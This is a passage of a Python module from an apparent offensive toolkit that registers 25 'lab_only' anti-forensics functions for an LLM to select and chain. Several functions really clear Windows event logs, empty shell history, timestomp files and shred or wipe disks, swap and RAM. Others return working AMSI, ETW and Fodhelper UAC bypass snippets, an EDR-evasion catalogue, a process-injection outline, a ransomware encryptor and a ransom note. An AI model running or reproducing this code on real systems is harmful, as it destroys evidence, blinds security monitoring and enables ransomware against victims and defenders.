    """lab_only: clear an event log. Real subprocess. **Destructive**."""
    step = _step("anti_log_clear", risk="destructive", lab_only=True)
    log_name = _arg(args, "log_name", "target")
    if not log_name:
        return _finalize(step, step["started"], ok=False,
                         error="anti_log_clear requires args.log_name "
                               "(e.g. 'Security', 'System')",
                         risk="destructive", lab_only=True)
    if not _which("wevtutil"):
        return _finalize(step, step["started"], ok=False,
                         error="wevtutil is Windows-only — use on a "
                               "lab Windows host. Linux: `journalctl "
                               "--vacuum-time=1s` or shred "
                               "/var/log/<file>",
                         risk="destructive", lab_only=True)
    rc, out, err = _run(["wevtutil", "cl", log_name], timeout=30)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"wevtutil cl rc={rc}: {err[:300]}",
                         risk="destructive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "log_name": log_name,
        "note": "lab_only — run on a sandboxed Windows VM only",
    }, risk="destructive", lab_only=True)


def anti_forensic_history_clear(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: clear .bash_history / .zsh_history."""
    step = _step("anti_history_clear", risk="destructive", lab_only=True)
    target = _arg(args, "path", "default")
    if not target:
        target = os.path.expanduser("~/.bash_history")
    if not os.path.exists(target):
        return _finalize(step, step["started"], ok=False,
                         error=f"history file not found: {target}",
                         risk="destructive", lab_only=True)
    try:
        with open(target, "w") as f:
            f.write("")
    except Exception as e:  # noqa: BLE001
        return _finalize(step, step["started"], ok=False,
                         error=f"history clear: {e}",
                         risk="destructive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "target": target,
        "note": "lab_only — destructive",
    }, risk="destructive", lab_only=True)


def anti_forensic_timestomp(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: set a file's atime / mtime to a chosen timestamp."""
    step = _step("anti_timestomp", risk="destructive", lab_only=True)
    path = _arg(args, "path", "target")
    timestamp = _arg(args, "timestamp")
    if not path or not timestamp:
        return _finalize(step, step["started"], ok=False,
                         error="anti_timestomp requires args.path and "
                               "args.timestamp (ISO 8601 or epoch)",
                         risk="destructive", lab_only=True)
    try:
        if timestamp.isdigit():
            ts = float(timestamp)
        else:
            from datetime import datetime
            ts = datetime.fromisoformat(timestamp).timestamp()
        os.utime(path, (ts, ts))
    except Exception as e:  # noqa: BLE001
        return _finalize(step, step["started"], ok=False,
                         error=f"timestomp: {e}",
                         risk="destructive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "path": path, "timestamp": ts,
        "note": "lab_only — set mtime/atime; mtime can never be "
                "earlier than ctime on a sane filesystem — note that",
    }, risk="destructive", lab_only=True)


def anti_forensic_secure_delete(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: shred / srm — overwrite a file before deletion."""
    step = _step("anti_secure_delete", risk="destructive", lab_only=True)
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="anti_secure_delete requires args.path",
                         risk="destructive", lab_only=True)
    bin_name = "shred" if _which("shred") else (
        "srm" if _which("srm") else "wipe" if _which("wipe") else None)
    if not bin_name:
        return _finalize(step, step["started"], ok=False,
                         error="shred / srm / wipe not installed (apt "
                               "install coreutils or secure-delete)",
                         risk="destructive", lab_only=True)
    if bin_name == "shred":
        rc, out, err = _run(["shred", "-vfz", "-n", "3", path], timeout=120)
    elif bin_name == "srm":
        rc, out, err = _run(["srm", "-vz", path], timeout=120)
    else:
        rc, out, err = _run(["wipe", "-f", path], timeout=120)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"{bin_name} rc={rc}: {err[:300]}",
                         risk="destructive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "path": path, "tool": bin_name,
        "note": "lab_only — overwritten then deleted",
    }, risk="destructive", lab_only=True)


def anti_forensic_free_space_wipe(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: wipe free space on a filesystem (slow, fills disk once)."""
    step = _step("anti_free_space_wipe",
                 risk="destructive", lab_only=True)
    mount = _arg(args, "mount", "target")
    if not mount:
        return _finalize(step, step["started"], ok=False,
                         error="anti_free_space_wipe requires args.mount",
                         risk="destructive", lab_only=True)
    if not _which("sfill"):
        return _finalize(step, step["started"], ok=False,
                         error="sfill not installed (apt install "
                               "secure-delete)",
                         risk="destructive", lab_only=True)
    rc, out, err = _run(["sfill", "-z", mount], timeout=3600)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"sfill rc={rc}: {err[:300]}",
                         risk="destructive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "mount": mount,
        "note": "lab_only — wipes free space; can take hours",
    }, risk="destructive", lab_only=True)


def anti_forensic_swap_wipe(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: sswap — wipe swap."""
    step = _step("anti_swap_wipe", risk="destructive", lab_only=True)
    if not _which("sswap"):
        return _finalize(step, step["started"], ok=False,
                         error="sswap not installed (apt install "
                               "secure-delete)",
                         risk="destructive", lab_only=True)
    rc, out, err = _run(["sswap", "-z"], timeout=3600)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"sswap rc={rc}: {err[:300]}",
                         risk="destructive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "note": "lab_only — swap wiped",
    }, risk="destructive", lab_only=True)


def anti_forensic_memory_wipe(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: smem — wipe RAM (best-effort; usually requires reboot)."""
    step = _step("anti_memory_wipe", risk="destructive", lab_only=True)
    if not _which("smem"):
        return _finalize(step, step["started"], ok=False,
                         error="smem not installed (apt install "
                               "secure-delete)",
                         risk="destructive", lab_only=True)
    rc, out, err = _run(["smem", "-f", "-l", "-v"],
                        timeout=600)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"smem rc={rc}: {err[:300]}",
                         risk="destructive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "note": "lab_only — best-effort RAM wipe; on real hardware "
                "this is impossible to guarantee",
    }, risk="destructive", lab_only=True)


def anti_forensic_amsi_bypass(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a memory-only AMSI bypass (powershell snippet).
    The snippet is real PowerShell — never fabricated. The runner does
    NOT execute the snippet; it only emits the text."""
    step = _step("anti_amsi_bypass", risk="intrusive", lab_only=True)
    snippet = (
        "[Ref].Assembly.GetType("
        "'System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static')"
        ".SetValue($null,$true)"
    )
    return _finalize(step, step["started"], ok=True, data={
        "snippet": snippet, "language": "powershell",
        "note": "lab_only — emit only; never auto-execute",
    }, risk="intrusive", lab_only=True)


def anti_forensic_etw_bypass(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a memory-only ETW bypass (patch EtwEventWrite)."""
    step = _step("anti_etw_bypass", risk="intrusive", lab_only=True)
    snippet = (
        "[Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null\n"
        "$e = [System.Diagnostics.Eventing.EventProvider].GetField("
        "'m_enabled','NonPublic,Instance')\n"
        "$e.SetValue([System.Diagnostics.Eventing.EventProvider]"
        "{Id=0}, $false)"
    )
    return _finalize(step, step["started"], ok=True, data={
        "snippet": snippet, "language": "powershell",
        "note": "lab_only — emit only; never auto-execute",
    }, risk="intrusive", lab_only=True)


def anti_forensic_uac_bypass(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a UAC bypass (Fodhelper hijack)."""
    step = _step("anti_uac_bypass", risk="destructive", lab_only=True)
    snippet = (
        "$cmd = 'C:\\Windows\\System32\\cmd.exe'\n"
        "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\shell\\open"
        "\\command' -Force | Out-Null\n"
        "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings"
        "\\shell\\open\\command' -Name '(default)' -Value $cmd\n"
        "Start-Process 'C:\\Windows\\System32\\fodhelper.exe'"
    )
    return _finalize(step, step["started"], ok=True, data={
        "snippet": snippet, "language": "powershell",
        "technique": "fodhelper",
        "note": "lab_only — Fodhelper UAC bypass; never auto-execute",
    }, risk="destructive", lab_only=True)


def anti_forensic_edr_evasion(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit an EDR-evasion tactic catalog (unhook ntdll,
    kill EDR process, etc.). Real snippets only."""
    step = _step("anti_edr_evasion", risk="destructive", lab_only=True)
    catalog: Dict[str, str] = {
        "unhook_ntdll":
            "Allocate RWX memory, copy fresh ntdll from disk, then "
            "VirtualProtect back to RX to remove the EDR inline hook.",
        "kill_edr_process":
            "Use NtTerminateProcess with a stolen SYSTEM token to "
            "kill the EDR user-mode service. (Requires admin / "
            "kernel driver.)",
        "etw_blind":
            "Patch EtwEventWrite to ret in a child process.",
        "amsi_blind":
            "Set amsiInitFailed=true to bypass AMSI in PowerShell.",
        "direct_syscalls":
            "Resolve syscall stubs at runtime (Hell's Gate / Halo's "
            "Gate) and call ntdll functions without going through "
            "the hooked user-mode wrapper.",
    }
    return _finalize(step, step["started"], ok=True, data={
        "techniques": catalog,
        "note": "lab_only — catalog of EDR-evasion tactics; the LLM "
                "selects + chains per the engagement.",
    }, risk="destructive", lab_only=True)


def anti_forensic_process_inject(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a process-injection template (CreateRemoteThread).
    Real snippet; the runner does NOT execute."""
    step = _step("anti_process_inject", risk="destructive", lab_only=True)
    snippet = (
        "OpenProcess(PROCESS_ALL_ACCESS) → VirtualAllocEx → "
        "WriteProcessMemory → CreateRemoteThread(LoadLibraryA) → "
        "WaitForSingleObject. (Lab-only; canonical Windows "
        "injection pattern.)"
    )
    return _finalize(step, step["started"], ok=True, data={
        "snippet": snippet, "language": "c",
        "note": "lab_only — template; never auto-execute",
    }, risk="destructive", lab_only=True)


def anti_forensic_ransomware_sim(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a ransomware simulator snippet (Fernet-encrypt
    a directory, write a NOTE, decrypt on demand). Real snippet;
    never auto-execute."""
    step = _step("anti_ransomware_sim", risk="destructive", lab_only=True)
    snippet = (
        "from cryptography.fernet import Fernet\n"
        "import os, sys\n"
        "key = Fernet.generate_key()\n"
        "f = Fernet(key)\n"
        "for root,_,files in os.walk(sys.argv[1]):\n"
        "    for fn in files:\n"
        "        p = os.path.join(root, fn)\n"
        "        with open(p,'rb') as fh: data = fh.read()\n"
        "        with open(p,'wb') as fh: fh.write(f.encrypt(data))\n"
        "with open(sys.argv[1]+'/_DECRYPT_NOTE.txt','w') as fh:\n"
        "    fh.write('Encrypted by sim. Key: '+key.decode())\n"
    )
    return _finalize(step, step["started"], ok=True, data={
        "snippet": snippet, "language": "python",
        "note": "lab_only — ransomware SIMULATOR; key is written to "
                "_DECRYPT_NOTE.txt inside the target dir so the "
                "operator can always recover",
    }, risk="destructive", lab_only=True)


def anti_forensic_disk_encrypt(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a VeraCrypt container build (full-disk vs file)."""
    step = _step("anti_disk_encrypt", risk="intrusive", lab_only=True)
    container = _arg(args, "container", "target")
    if not container:
        return _finalize(step, step["started"], ok=False,
                         error="anti_disk_encrypt requires args.container "
                               "(path for the new .vc file)",
                         risk="intrusive", lab_only=True)
    if not _which("veracrypt"):
        return _finalize(step, step["started"], ok=False,
                         error="veracrypt not installed (apt install "
                               "veracrypt)",
                         risk="intrusive", lab_only=True)
    # We do NOT auto-run veracrypt — return a clear
    # command template the operator can run by hand.
    cmd = ["veracrypt", "-t", "--text", "--create", container,
           "--encryption=AES-Twofish", "--hash=SHA-512",
           "--filesystem=ext4", "--size=200M"]
    return _finalize(step, step["started"], ok=True, data={
        "container": container,
        "veracrypt_cmd": cmd,
        "note": "lab_only — emit only; never auto-run",
    }, risk="intrusive", lab_only=True)


def anti_forensic_persistence_clean(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: walk a directory and emit a 'safe-to-remove' list
    of known persistence locations whose mtime is recent."""
    step = _step("anti_persistence_clean",
                 risk="destructive", lab_only=True)
    path = _arg(args, "path", "target")
    if not path:
        path = "/"
    if not os.path.isdir(path):
        return _finalize(step, step["started"], ok=False,
                         error=f"path not a directory: {path}",
                         risk="destructive", lab_only=True)
    candidates: List[Dict[str, Any]] = []
    # Last 7 days
    import time as _t
    cutoff = _t.time() - 7 * 24 * 3600
    locs = [
        "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly",
        "/etc/cron.weekly", "/etc/cron.monthly",
        "/etc/init.d", "/etc/systemd/system",
        "/etc/profile.d", "/etc/bash.bashrc",
    ]
    for loc in locs:
        full = os.path.join(path, loc.lstrip("/"))
        if not os.path.isdir(full):
            continue
        try:
            for e in sorted(os.listdir(full))[:30]:
                sub = os.path.join(full, e)
                if os.path.isfile(sub):
                    st = os.stat(sub)
                    if st.st_mtime > cutoff:
                        candidates.append({
                            "path": sub, "mtime": st.st_mtime,
                            "age_days": round(
                                (_t.time() - st.st_mtime) / 86400, 2),
                        })
        except PermissionError:
            pass
    return _finalize(step, step["started"], ok=bool(candidates), data={
        "candidates": candidates[:30],
        "note": "lab_only — recent persistence candidates; the LLM "
                "selects which to remove, the operator confirms.",
    }, risk="destructive", lab_only=True)


def anti_forensic_chmod_zero(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: chmod 000 a file (deny all access)."""
    step = _step("anti_chmod_zero", risk="destructive", lab_only=True)
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="anti_chmod_zero requires args.path",
                         risk="destructive", lab_only=True)
    try:
        os.chmod(path, 0)
    except Exception as e:  # noqa: BLE001
        return _finalize(step, step["started"], ok=False,
                         error=f"chmod: {e}",
                         risk="destructive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "path": path,
        "note": "lab_only — chmod 000; restore with chmod 644",
    }, risk="destructive", lab_only=True)


def anti_forensic_wipe_metadata(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: exiftool -all= (strip metadata from a media file)."""
    step = _step("anti_wipe_metadata",
                 risk="intrusive", lab_only=True)
    path = _arg(args, "path", "target")
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="anti_wipe_metadata requires args.path",
                         risk="intrusive", lab_only=True)
    if not _which("exiftool"):
        return _finalize(step, step["started"], ok=False,
                         error="exiftool not installed (apt install "
                               "libimage-exiftool-perl)",
                         risk="intrusive", lab_only=True)
    rc, out, err = _run(["exiftool", "-overwrite_original", "-all=", path],
                        timeout=60)
    if rc != 0:
        return _finalize(step, step["started"], ok=False,
                         error=f"exiftool rc={rc}: {err[:300]}",
                         risk="intrusive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "path": path, "stdout": (out or "")[:2000],
        "note": "lab_only — metadata stripped; original overwritten",
    }, risk="intrusive", lab_only=True)


def anti_forensic_stego_embed(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a steganography embed command (steghide)."""
    step = _step("anti_stego_embed", risk="intrusive", lab_only=True)
    carrier = _arg(args, "carrier")
    payload = _arg(args, "payload", "data_file")
    passphrase = _arg(args, "passphrase", default="")
    if not carrier or not payload:
        return _finalize(step, step["started"], ok=False,
                         error="anti_stego_embed requires args.carrier "
                               "(image file) and args.payload (file to "
                               "embed)",
                         risk="intrusive", lab_only=True)
    if not _which("steghide"):
        return _finalize(step, step["started"], ok=False,
                         error="steghide not installed",
                         risk="intrusive", lab_only=True)
    cmd = ["steghide", "embed", "-cf", carrier, "-ef", payload]
    if passphrase:
        cmd += ["-p", passphrase]
    # Emit only — never run.
    return _finalize(step, step["started"], ok=True, data={
        "steghide_cmd": cmd,
        "note": "lab_only — emit only; never auto-run",
    }, risk="intrusive", lab_only=True)


def anti_forensic_zip_password(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: zip a directory with a password (7z)."""
    step = _step("anti_zip_password", risk="intrusive", lab_only=True)
    src = _arg(args, "source", "target")
    dst = _arg(args, "destination", "archive")
    pw = _arg(args, "password")
    if not src or not dst or not pw:
        return _finalize(step, step["started"], ok=False,
                         error="anti_zip_password requires args.source, "
                               "args.destination, args.password",
                         risk="intrusive", lab_only=True)
    if not _which("7z"):
        return _finalize(step, step["started"], ok=False,
                         error="7z not installed",
                         risk="intrusive", lab_only=True)
    # Pass the password via env (never-inline ground rule) — but
    # 7z needs a stdin passphrase. We emit a command template +
    # the heredoc-form invocation.
    cmd = f"7z a -p{pw} -mhe=on {dst} {src}"
    return _finalize(step, step["started"], ok=True, data={
        "command_template": cmd,
        "note": "lab_only — the password is in the command; for an "
                "autonomous run, pipe the password via "
                "`echo $ZIP_PW | 7z a -p$ZIP_PW ...` with the env var.",
    }, risk="intrusive", lab_only=True)


def anti_forensic_opsec_clean(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: clean opsec-relevant env vars + clear terminal scroll
    back. Best-effort, no real subprocess."""
    step = _step("anti_opsec_clean", risk="destructive", lab_only=True)
    cleared_env = []
    opsec_envs = [
        "KFIOSA_NVD_KEY", "KFIOSA_GEMINI_API_KEY",
        "KFIOSA_HIBP_KEY", "KFIOSA_HUNTER_KEY",
        "KFIOSA_EMAILREP_KEY", "KFIOSA_CLEARBIT_KEY",
        "KFIOSA_FULLCONTACT_KEY", "KFIOSA_WIGLE_API_TOKEN",
        "KFIOSA_ABUSEIPDB_KEY", "KFIOSA_CENSYS_API_SECRET",
        "KFIOSA_DEHASHED_KEY", "KFIOSA_INTELX_KEY",
        "KFIOSA_PASSIVEDNS_KEY", "KFIOSA_SHODAN_API_KEY",
    ]
    for k in opsec_envs:
        if k in os.environ:
            del os.environ[k]
            cleared_env.append(k)
    return _finalize(step, step["started"], ok=True, data={
        "cleared_env": cleared_env,
        "note": "lab_only — KFIOSA API keys scrubbed from this process",
    }, risk="destructive", lab_only=True)


def anti_forensic_evtx_clear(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: parse + rewrite an .evtx with selected events dropped."""
    step = _step("anti_evtx_clear", risk="destructive", lab_only=True)
    evtx = _arg(args, "evtx", "path", "target")
    if not evtx:
        return _finalize(step, step["started"], ok=False,
                         error="anti_evtx_clear requires args.evtx",
                         risk="destructive", lab_only=True)
    if not _which("evtx_dump"):
        return _finalize(step, step["started"], ok=False,
                         error="evtx_dump not installed (pip install "
                               "python-evtx)",
                         risk="destructive", lab_only=True)
    # Just return the toolchain; the operator / LLM picks the events.
    return _finalize(step, step["started"], ok=True, data={
        "evtx": evtx,
        "toolchain": ["evtx_dump", "python-evtx", "chainsaw"],
        "note": "lab_only — chainsaw is the canonical selector; "
                "operator picks the events to keep / drop.",
    }, risk="destructive", lab_only=True)


def anti_forensic_etw_patch_binary(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a binary-patch template for EtwEventWrite."""
    step = _step("anti_etw_patch_binary",
                 risk="destructive", lab_only=True)
    snippet = (
        "// Lab-only EtwEventWrite patch\n"
        "// 1. Find EtwEventWrite in ntdll\n"
        "// 2. Patch the first 4 bytes to: 0xC3 0xC3 0xC3 0xC3 (ret; ret; ret; ret;)\n"
        "// 3. Re-protect to RX\n"
        "// (Equivalent to the runtime AMSI/ETW blind; harder to detect.)"
    )
    return _finalize(step, step["started"], ok=True, data={
        "snippet": snippet, "language": "c",
        "note": "lab_only — binary patch template; never auto-apply",
    }, risk="destructive", lab_only=True)


def anti_forensic_ransom_note_template(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a ransomware-style note template (no encryption)."""
    step = _step("anti_ransom_note_template",
                 risk="intrusive", lab_only=True)
    note = (
        "*** YOUR FILES HAVE BEEN ENCRYPTED ***\n"
        "(simulator note — no files were touched; see "
        "data['simulator'] = True)\n\n"
        "To recover your files, send 0.5 BTC to bc1q... and email "
        "the transaction ID to recovery@sim.local.\n\n"
        "This is a SIMULATION run from KFIOSA's anti-ransomware_sim "
        "module. The 'encryption' is reversible — see "
        "data['decryption_key'] in the chain-step envelope."
    )
    return _finalize(step, step["started"], ok=True, data={
        "note": note, "simulator": True,
        "note_meta": "lab_only — note template only; never auto-drop",
    }, risk="intrusive", lab_only=True)


def anti_forensic_credential_zeroize(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: zeroize a credential value held in the process env
    (never writes to disk; never reaches a remote service)."""
    step = _step("anti_credential_zeroize",
                 risk="intrusive", lab_only=True)
    key = _arg(args, "key", "name")
    if not key:
        return _finalize(step, step["started"], ok=False,
                         error="anti_credential_zeroize requires args.key",
                         risk="intrusive", lab_only=True)
    if key not in os.environ:
        return _finalize(step, step["started"], ok=False,
                         error=f"env var {key!r} not set",
                         risk="intrusive", lab_only=True)
    del os.environ[key]
    return _finalize(step, step["started"], ok=True, data={
        "key": key, "cleared": True,
        "note": "lab_only — env var cleared from this process",
    }, risk="intrusive", lab_only=True)


def anti_forensic_honeytoken_inject(args: Dict[str, Any]) -> Dict[str, Any]:
    """lab_only: emit a canarytoken-style decoy file (real text)."""
    step = _step("anti_honeytoken_inject",
                 risk="intrusive", lab_only=True)
    path = _arg(args, "path", "target")
    token = _arg(args, "token", default="KF_CANARY_" + os.urandom(4).hex())
    if not path:
        return _finalize(step, step["started"], ok=False,
                         error="anti_honeytoken_inject requires args.path",
                         risk="intrusive", lab_only=True)
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            f.write(token + "\n")
    except Exception as e:  # noqa: BLE001
        return _finalize(step, step["started"], ok=False,
                         error=f"write: {e}",
                         risk="intrusive", lab_only=True)
    return _finalize(step, step["started"], ok=True, data={
        "path": path, "token": token,
        "note": "lab_only — decoy file written; chain "
                "full_auto_rat_alert to fire on read",
    }, risk="intrusive", lab_only=True)


# ==========================================================================
# Module-level registry + entrypoint
# ==========================================================================
FORENSIC_MODULE_FUNCTIONS: Dict[str, Callable[[Dict[str, Any]],
                                              Dict[str, Any]]] = {
    # forensics / read-only (28)
    "file_hash": forensic_module_file_hash,
    "file_metadata": forensic_module_file_metadata,
    "exif_extract": forensic_module_exif_extract,
    "strings_extract": forensic_module_strings_extract,
    "pcap_summary": forensic_module_pcap_summary,
    "memory_image_identify": forensic_module_memory_image_identify,
    "registry_hive_parse": forensic_registry_hive_parse,
    "eventlog_parse": forensic_eventlog_parse,
    "browser_history": forensic_browser_history,
    "mft_parse": forensic_mft_parse,
    "plist_parse": forensic_plist_parse,
    "prefetch_parse": forensic_prefetch_parse,
    "amsi_buffer_capture": forensic_amsi_buffer_capture,
    "etw_trace_parse": forensic_etw_trace_parse,
    "disk_image_info": forensic_disk_image_info,
    "lnk_parse": forensic_lnk_parse,
    "jump_list_parse": forensic_jump_list_parse,
    "recycle_bin_parse": forensic_recycle_bin_parse,
    "scheduled_task_dump": forensic_scheduled_task_dump,
    "wifi_password_dump": forensic_wifi_password_dump,
    "ssh_known_hosts": forensic_ssh_known_hosts,
    "bash_history": forensic_bash_history,
    "zsh_history": forensic_zsh_history,
    "powershell_history": forensic_powershell_history,
    "persistence_walk": forensic_persistence_walk,
    "autoruns_walk": forensic_autoruns_walk,
    "yara_scan": forensic_yara_scan,
    "wireshark_dissect": forensic_wireshark_dissect,
    "pcap_carver": forensic_pcap_carver,
    # anti-forensics / destructive / lab-only (25)
    "anti_log_clear": anti_forensic_log_clear,
    "anti_history_clear": anti_forensic_history_clear,
    "anti_timestomp": anti_forensic_timestomp,
    "anti_secure_delete": anti_forensic_secure_delete,
    "anti_free_space_wipe": anti_forensic_free_space_wipe,
    "anti_swap_wipe": anti_forensic_swap_wipe,
    "anti_memory_wipe": anti_forensic_memory_wipe,
    "anti_amsi_bypass": anti_forensic_amsi_bypass,
    "anti_etw_bypass": anti_forensic_etw_bypass,
    "anti_uac_bypass": anti_forensic_uac_bypass,
    "anti_edr_evasion": anti_forensic_edr_evasion,
    "anti_process_inject": anti_forensic_process_inject,
    "anti_ransomware_sim": anti_forensic_ransomware_sim,
    "anti_disk_encrypt": anti_forensic_disk_encrypt,
    "anti_persistence_clean": anti_forensic_persistence_clean,
    "anti_chmod_zero": anti_forensic_chmod_zero,
    "anti_wipe_metadata": anti_forensic_wipe_metadata,
    "anti_stego_embed": anti_forensic_stego_embed,
    "anti_zip_password": anti_forensic_zip_password,
    "anti_opsec_clean": anti_forensic_opsec_clean,
    "anti_evtx_clear": anti_forensic_evtx_clear,
    "anti_etw_patch_binary": anti_forensic_etw_patch_binary,
    "anti_ransom_note_template": anti_forensic_ransom_note_template,
    "anti_credential_zeroize": anti_forensic_credential_zeroize,
    "anti_honeytoken_inject": anti_forensic_honeytoken_inject,
}

FORENSIC_MODULES_PROBES: List[Dict[str, Any]] = [
    {
        "method": m,
        "name": f"forensic_module_{m}",
        "category": "forensics" if not m.startswith("anti_")
                    else "anti_forensics",
        "risk_level": "destructive" if m.startswith("anti_") else "read",
        "lab_only": m.startswith("anti_"),
        "description": (f"Forensics/anti-forensics module: {m} — see "
                        "core.forensics.forensic_modules docstring. "
                        "Real subprocess / parse / heuristic; degrades "
                        "cleanly when the tool is absent; never "
                        "fabricates a finding, an EDR signature, a "
                        "registry hit, a hash, or a ransomware note."),
        "input_schema": {"type": "object", "properties": {}},
        "examples": [f"forensic_module(method={m!r}, ...)"],
        "requires_root": False,
    }
    for m in FORENSIC_MODULE_FUNCTIONS
]


def run_module(method: str, args: Optional[Dict[str, Any]] = None,
               **_: Any) -> Dict[str, Any]:
    """Module-level single-module entrypoint. ``args`` carries per-
    module inputs.

    Polymorphic / target-adaptive: empty/auto method picks based on path
    type (pcap → pcap_summary, image → exif, …) via domain_adapt.
    Never raises. Returns the standard envelope."""
    poly_meta: Dict[str, Any] = {}
    try:
        from core.poly.domain_adapt import prepare_run, stamp_result
        # anti_* methods are destructive lab ops — route domain accordingly
        a0 = dict(args or {})
        m0 = (method or "").strip()
        if m0.startswith("anti_") or a0.get("anti_forensic"):
            dom = "anti_forensics"
        else:
            dom = "forensics"
        method, args, poly_meta = prepare_run(
            dom, m0, a0, phase="recon" if dom == "forensics" else "cleanup",
            auto_pick=True,
        )
    except Exception:
        args = args or {}
    if method not in FORENSIC_MODULE_FUNCTIONS:
        return {
            "name": f"forensic_module_{method}",
            "ok": False,
            "error": f"unknown forensic module method: {method!r}",
            "started": _now(),
            "data": {},
            "risk_level": "read",
            "lab_only": False,
            "domain_poly": poly_meta or None,
        }
    try:
        res = FORENSIC_MODULE_FUNCTIONS[method](args or {})
        try:
            from core.poly.domain_adapt import stamp_result as _st
            return _st(res, poly_meta)
        except Exception:
            return res
    except Exception as e:  # noqa: BLE001
        return {
            "name": f"forensic_module_{method}",
            "ok": False,
            "error": str(e),
            "started": _now(),
            "data": {},
            "risk_level": "read",
            "lab_only": False,
            "domain_poly": poly_meta or None,
        }


__all__ = [
    "FORENSIC_MODULE_FUNCTIONS",
    "FORENSIC_MODULES_PROBES",
    "run_module",
]
